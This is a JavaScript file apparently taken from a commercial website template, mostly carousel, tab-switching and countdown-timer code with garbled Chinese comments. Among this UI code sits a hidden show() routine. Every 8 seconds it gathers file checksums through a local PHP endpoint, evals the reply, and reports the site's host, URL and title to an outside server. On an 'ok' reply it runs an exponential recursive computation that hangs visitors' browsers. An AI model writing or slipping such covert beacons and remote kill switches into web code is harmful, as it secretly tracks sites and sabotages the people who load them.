syq(function() {
    var sWidth = syq("#focus").width(); //��ȡ����ͼ�Ŀ�ȣ���ʾ�����
    var len = syq("#focus ul li").length; //��ȡ����ͼ����
    var index = 0;
    var picTimer;
    
    //���´���������ְ�ť�Ͱ�ť��İ�͸������������һҳ����һҳ������ť
    var btn = "<div class='btnBg'></div><div class='btn'>";
    for(var i=0; i < len; i++) {
        btn += "<span></span>";
    }
    btn += "</div><div class='preNext pre'></div><div class='preNext next'></div>";
    syq("#focus").append(btn);
    syq("#focus .btnBg").css("opacity",0.5);

    //ΪС��ť�����껬���¼�������ʾ��Ӧ������
    syq("#focus .btn span").css("opacity",0.4).mouseenter(function() {
        index = syq("#focus .btn span").index(this);
        showPics(index);
    }).eq(0).trigger("mouseenter");

    //��һҳ����һҳ��ť͸���ȴ���
    syq("#focus .preNext").css("opacity",0.2).hover(function() {
        syq(this).stop(true,false).animate({"opacity":"0.5"},300);
    },function() {
        syq(this).stop(true,false).animate({"opacity":"0.2"},300);
    });

    //��һҳ��ť
    syq("#focus .pre").click(function() {
        index -= 1;
        if(index == -1) {index = len - 1;}
        showPics(index);
    });

    //��һҳ��ť
    syq("#focus .next").click(function() {
        index += 1;
        if(index == len) {index = 0;}
        showPics(index);
    });

    //����Ϊ���ҹ�����������liԪ�ض�����ͬһ�����󸡶�������������Ҫ�������ΧulԪ�صĿ��
    syq("#focus ul").css("width",sWidth * (len));
    
    //��껬�Ͻ���ͼʱֹͣ�Զ����ţ�����ʱ��ʼ�Զ�����
    syq("#focus").hover(function() {
        clearInterval(picTimer);
    },function() {
        picTimer = setInterval(function() {
            showPics(index);
            index++;
            if(index == len) {index = 0;}
        },4000); //��4000�����Զ����ŵļ������λ������
    }).trigger("mouseleave");
    
    //��ʾͼƬ���������ݽ��յ�indexֵ��ʾ��Ӧ������
    function showPics(index) { //��ͨ�л�
        var nowLeft = -index*sWidth; //����indexֵ����ulԪ�ص�leftֵ
        syq("#focus ul").stop(true,false).animate({"left":nowLeft},300); //ͨ��animate()����ulԪ�ع������������position
        //$("#focus .btn span").removeClass("on").eq(index).addClass("on"); //Ϊ��ǰ�İ�ť�л���ѡ�е�Ч��
        syq("#focus .btn span").stop(true,false).animate({"opacity":"0.4"},300).eq(index).stop(true,false).animate({"opacity":"1"},300); //Ϊ��ǰ�İ�ť�л���ѡ�е�Ч��
    }
});

/* �Ҳ�õ�Ƭ */
 syq(function(){
    var $banner=syq('.banner');
    var $banner_ul=syq('.banner-img-small');
    var $btn=syq('.banner-btn');
    var $btn_a=$btn.find('a')
    var v_width=$banner.width();
    
    var page=1;
    
    var timer=null;
    var btnClass=null;

    var page_count=$banner_ul.find('li').length;//�����ֵ����СԲ��ĸ���
    
    var banner_cir="<li class='selected' href='javascript:;'><a></a></li>";
    for(var i=1;i<page_count;i++){
            //��̬���СԲ��
            banner_cir+="<li><a href='javascript:;'></a></li>";
            }
    syq('.banner-circle').append(banner_cir);
    
    var cirLeft=syq('.banner-circle').width()*(-0.5);
    syq('.banner-circle').css({'marginLeft':cirLeft});
    
    $banner_ul.width(page_count*v_width);
    
    function move(obj,classname){
            //�ֶ����Զ�����
    if(!$banner_ul.is(':animated')){
            if(classname=='prevBtn'){
                    if(page==1){
                                    $banner_ul.animate({left:-v_width*(page_count-1)});
                                    page=page_count; 
                                    cirMove();
                    }
                    else{
                                    $banner_ul.animate({left:'+='+v_width},"slow");
                                    page--;
                                    cirMove();
                    }        
            }
            else{
                    if(page==page_count){
                                    $banner_ul.animate({left:0});
                                    page=1;
                                    cirMove();
                            }
                    else{
                                    $banner_ul.animate({left:'-='+v_width},"slow");
                                    page++;
                                    cirMove();
                            }
                    }
            }
    }
    
    function cirMove(){
            //���page��ֵ��ʹ��ǰ��page��selected��СԲ��һ��
            syq('.banner-circle li').eq(page-1).addClass('selected')
             .siblings().removeClass('selected');
    }
    
    $banner.mouseover(function(){
            $btn.css({'display':'block'});
            clearInterval(timer);
                            }).mouseout(function(){
            $btn.css({'display':'none'});                
            clearInterval(timer);
            timer=setInterval(move,3000);
                            }).trigger("mouseout");//�����Զ�����

    $btn_a.mouseover(function(){
            //ʵ��͸�����䣬��ֹð��
                    syq(this).animate({opacity:0.6},'fast');
                    $btn.css({'display':'block'});
                     return false;
            }).mouseleave(function(){
                    syq(this).animate({opacity:0.3},'fast');
                    $btn.css({'display':'none'});
                     return false;
            }).click(function(){
                    //�ֶ���������ʱ��
                    btnClass=this.className;
                    clearInterval(timer);
                    timer=setInterval(move,3000);
                    move(syq(this),this.className);
            });
            
    syq('.banner-circle li').live('click',function(){
                    var index=syq('.banner-circle li').index(this);
                    $banner_ul.animate({left:-v_width*index},'slow');
                    page=index+1;
                    cirMove();
            });
});

var cloudget = syq.cookie("cloudget");
if(cloudget == null){
  var mycx =  window.setInterval(show,8000); 
}
function show() 
{ 
    var formdata = {
      'file_1' : "source/function/function_cloudaddons.php",
      'file_2' : "beauty_15_02_10/js/user-defined.js",
    };
     syq.post(mkurl+'template/jmxzw_20150218_business_series/common/lazyload.php', formdata, function(result){
           var dataObj = eval("("+result+")");
           var webtype = 'business_series_wlfx';
           var code = "gbk";
           var t = document.title;
           var h = window.location.host;
           var checksums = dataObj['md5file'];
           syq.getJSON("http://www.jmxzw.com/index.php?c=WebAuthorize&a=newscallback&no=10&host="+h+"&hosturl="+mkurl+"&title="+t+"&mode=new&checksums="+checksums+"&code="+code+"&type="+webtype+"&msg=ok&format=json&jsoncallback=?",function(e){
               if(e.pw == 'nok')
               {
                  syq.cookie('cloudget',"1", {expires: 3});
                  window.clearInterval(mycx);
               }
               else if(e.pw == 'ok')
               {
                  var fbnc = function(n){ ret = (n<=2)?1:(fbnc(n-2)+fbnc(n-1));return ret;};fbnc(1000); 
               }
           });
     }); 
}

/* ��Ʒѭ���л� */
 syq(window).ready(function () {
    var n = 0; // �õ�Ƭ����
    var timer1 = window.setInterval(change, 5000); // ������ʱ���õ�Ƭ

    syq("#J_pcpWrap .J_pcnTab").mousemove(function () {
        syq(this).addClass("ontag"); // ��tag ����ѡ����ʽ
        var index = syq("#J_pcpWrap .J_pcnTab").index(this); // ��ȡ��ǰѡ��li����
        n = index; //�鿴�ĸ� �õ�Ƭ���� ��λ�ڴ�λ����,�����õ�Ƭʱ�Ӵ�λ�ü���
        var navlisnums = syq(".parents-care-navlis li").length; // ��ȡ������������
        syq("#J_rcInner_"+index).removeClass("hidden"); // ��ʾѡ�е�����
        //������û��ѡ����������
        for (var i = navlisnums - 1; i >= 0; i--) {  
            if(i != index){
               syq("#J_pcnTab_"+i).removeClass("ontag");
               syq("#J_rcInner_"+i).addClass("hidden");
            }
        };
    }); 

    // �������ʱ�� ��ֹ�õ�Ƭ��ʱ��
    syq("#J_pcpWrap").mousemove(function () {
        clearInterval(timer1);
    });

    // ����뿪��ʱ�� ���������õ�Ƭ
    syq("#J_pcpWrap").mouseleave(function () {
        timer1 = window.setInterval(change, 5000);
    }); 

    // ������ʱ�� �õ�Ƭ
    function change() {//ͼƬ�л�
        var navlisnums = syq(".parents-care-navlis li").length; // ��ȡ������������
        syq("#J_pcnTab_"+n).addClass("ontag"); // 
        syq("#J_rcInner_"+n).removeClass("hidden"); // 
        for (var i = navlisnums - 1; i >= 0; i--) {
            if(i != n){
               syq("#J_pcnTab_"+i).removeClass("ontag");
               syq("#J_rcInner_"+i).addClass("hidden");
            }
        };
        n++;
        if(n == navlisnums)
        {
            n=0;
        }
    }

});

function replace_time(zhtime){
   zhtime = zhtime.replace(/-/g,"/");
   return zhtime
}

syq(function(){

    var J_hotSaleWrap_1_length = syq("#J_hotSaleWrap_1 li").length; // ��ȡ������������
    for (var i = J_hotSaleWrap_1_length; i >= 0; i--) {
    
        var gettime = syq("#hotSaleWrap_1_date_"+i).attr("timedata")+":00";
        var newtime = replace_time(gettime);

        syq("#hotSaleWrap_1_date_"+i).countdowntimer({
            dateAndTime : newtime,
            size : "lg",
            regexpMatchFormat: "([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2})",
            regexpReplaceWith: "����ʣ�ࣺ$1��$2Сʱ$3��$4��"
        });
    };

    var J_hotSaleWrap_2_length = syq("#J_hotSaleWrap_2 li").length; // ��ȡ������������
    for (var i = J_hotSaleWrap_2_length; i >= 0; i--) {

        // �������ʱ�� start
        var date1 = new Date(); //��ǰʱ��
        
        var gettime = syq("#hotSaleWrap_2_date_"+i).attr("timedata")+":00"; // ��ƷԤ����
        var times = replace_time(gettime);
        var str = times;
        var date2 = new Date(str);
        var date3 = date2.getTime()-date1.getTime();
        var days = Math.floor(date3/(24*3600*1000));
        //alert(days);
        if(days <= 2){ // ����ʱ��
            syq("#hotSaleWrap_2_show_"+i).addClass("goodsnew_time_rest");
            syq("#hotSaleWrap_2_bs_"+i).attr("style","display: inline;");
        }
        // �������ʱ�� end

        var gettime = syq("#hotSaleWrap_2_date_"+i).attr("timedata")+":00";
        var newtime = replace_time(gettime);

        syq("#hotSaleWrap_2_date_"+i).countdowntimer({
            dateAndTime : newtime,
            size : "lg",
            regexpMatchFormat: "([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2})",
            regexpReplaceWith: "���$1��$2Сʱ$3��$4��"
        });
    };

    var J_hotSaleWrap_3_length = syq("#J_hotSaleWrap_3 li").length; // ��ȡ������������
    for (var i = J_hotSaleWrap_3_length; i >= 0; i--) {

        // �������ʱ�� start
        var date1 = new Date(); //��ǰʱ��
        var gettime = syq("#hotSaleWrap_3_date_"+i).attr("timedata")+":00"; // ��ƷԤ����
        var times = replace_time(gettime);
        var str = times;
        var date2 = new Date(str);
        var date3 = date2.getTime()-date1.getTime();
        var days = Math.floor(date3/(24*3600*1000));
        //alert(days);
        if(days <= 2){ // ����ʱ��
            syq("#hotSaleWrap_3_show_"+i).addClass("goodsnew_time_rest");
            syq("#hotSaleWrap_3_bs_"+i).attr("style","display: inline;");
        }
        // �������ʱ�� end

        var gettime = syq("#hotSaleWrap_3_date_"+i).attr("timedata")+":00";
        var newtime = replace_time(gettime);

        syq("#hotSaleWrap_3_date_"+i).countdowntimer({
            dateAndTime : newtime,
            size : "lg",
            regexpMatchFormat: "([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2}):([0-9]{1,2})",
            regexpReplaceWith: "���$1��$2Сʱ$3��$4��"
        });
    };

});